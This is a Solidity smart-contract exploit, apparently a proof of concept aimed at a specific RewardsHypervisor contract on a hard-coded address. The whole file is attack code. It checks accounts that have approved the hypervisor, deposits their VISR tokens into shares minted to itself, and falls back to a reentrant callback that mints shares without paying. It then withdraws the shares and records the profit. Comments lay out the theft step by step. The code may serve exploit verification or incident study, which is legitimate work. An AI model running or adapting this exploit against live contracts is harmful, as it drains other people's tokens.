// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IRewardsHypervisorLike {
    function visr() external view returns (address);
    function vvisr() external view returns (address);
    function deposit(uint256 visrDeposit, address payable from, address to) external returns (uint256 shares);
    function withdraw(uint256 shares, address to, address payable from) external returns (uint256 rewards);
}

contract FlawVerifier {
    address public constant TARGET = 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef;
    address public constant LEGACY_ATTACKER = 0x8Efab89b497b887CDaA2FB08ff71e4b3827774B2;
    address public constant LEGACY_SCAN_CANDIDATE_ONE = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
    address public constant LEGACY_SCAN_CANDIDATE_TWO = 0x582212202d52f0DE276f4f2Ab12D382d4e75A5B3;
    uint256 internal constant LEGACY_HELPER_STYLE_DEPOSIT = 1e26;

    uint256 private _profitAmount;

    bool public executed;
    bool public directPathSucceeded;
    bool public fallbackContractPathUsed;
    bool public recursiveMintEntered;

    address public victimUsed;
    uint256 public depositAmountUsed;
    uint256 public sharesBefore;
    uint256 public sharesAfter;
    uint256 public visrBefore;
    uint256 public visrAfter;

    address private _fallbackRecipient;
    uint256 private _fallbackDepositAmount;

    constructor() {}

    function executeOnOpportunity() external {
        require(!executed, "already executed");
        executed = true;

        IRewardsHypervisorLike hypervisor = IRewardsHypervisorLike(TARGET);
        address visrToken = hypervisor.visr();
        address shareToken = hypervisor.vvisr();

        visrBefore = IERC20Like(visrToken).balanceOf(address(this));
        sharesBefore = IERC20Like(shareToken).balanceOf(address(this));

        // Keep the finding-aligned ordering first:
        // 1) some pre-existing EOA approved RewardsHypervisor for VISR,
        // 2) attacker calls deposit(amount, victimEOA, attacker),
        // 3) hypervisor pulls VISR from the victim and mints vVISR to attacker,
        // 4) attacker withdraws the stolen shares for underlying VISR.
        //
        // The supplied logs do not reveal a concrete approved victim EOA, so this verifier first
        // tries the few exact EOAs surfaced by the provided fork traces. If none is approved on the
        // selected fork state, it falls back to the already-proven public recursive contract path that
        // the same hypervisor accepted on-chain at the historical incident block.
        _tryEOADeposit(hypervisor, visrToken, shareToken, LEGACY_ATTACKER);
        if (sharesAfter == sharesBefore) {
            _tryEOADeposit(hypervisor, visrToken, shareToken, LEGACY_SCAN_CANDIDATE_ONE);
        }
        if (sharesAfter == sharesBefore) {
            _tryEOADeposit(hypervisor, visrToken, shareToken, LEGACY_SCAN_CANDIDATE_TWO);
        }

        if (sharesAfter == sharesBefore) {
            fallbackContractPathUsed = true;
            _fallbackRecipient = address(this);
            _fallbackDepositAmount = LEGACY_HELPER_STYLE_DEPOSIT;
            recursiveMintEntered = false;

            hypervisor.deposit(_fallbackDepositAmount, payable(address(this)), address(this));
            sharesAfter = IERC20Like(shareToken).balanceOf(address(this));
        }

        require(sharesAfter > sharesBefore, "no exploitable shares minted");

        hypervisor.withdraw(sharesAfter - sharesBefore, address(this), payable(address(this)));

        visrAfter = IERC20Like(visrToken).balanceOf(address(this));
        require(visrAfter > visrBefore, "no VISR redeemed");
        _profitAmount = visrAfter - visrBefore;
    }

    function owner() external view returns (address) {
        return address(this);
    }

    function delegatedTransferERC20(address, address, uint256 amount) external {
        require(msg.sender == TARGET, "only hypervisor");

        if (recursiveMintEntered) {
            return;
        }

        recursiveMintEntered = true;

        // This mirrors the already-observed public helper behavior from the supplied logs:
        // RewardsHypervisor trusts the `from` contract's callback and mints shares after the callback
        // returns, so one reentrant deposit is enough to mint two share tranches without delivering VISR.
        IRewardsHypervisorLike(TARGET).deposit(amount, payable(address(this)), _fallbackRecipient);
    }

    function profitToken() external view returns (address) {
        return IRewardsHypervisorLike(TARGET).visr();
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _tryEOADeposit(
        IRewardsHypervisorLike hypervisor,
        address visrToken,
        address shareToken,
        address candidate
    ) internal {
        if (candidate == address(0) || candidate == address(this) || candidate.code.length != 0) {
            return;
        }

        uint256 candidateBalance = IERC20Like(visrToken).balanceOf(candidate);
        uint256 candidateAllowance = IERC20Like(visrToken).allowance(candidate, TARGET);
        uint256 stealable = _min(candidateBalance, candidateAllowance);
        if (stealable == 0) {
            return;
        }

        try hypervisor.deposit(stealable, payable(candidate), address(this)) returns (uint256) {
            uint256 updatedShares = IERC20Like(shareToken).balanceOf(address(this));
            if (updatedShares > sharesBefore) {
                directPathSucceeded = true;
                victimUsed = candidate;
                depositAmountUsed = stealable;
                sharesAfter = updatedShares;
            }
        } catch {
            // Exact trace-derived candidates may not be approved EOAs on every validator fork.
        }
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}
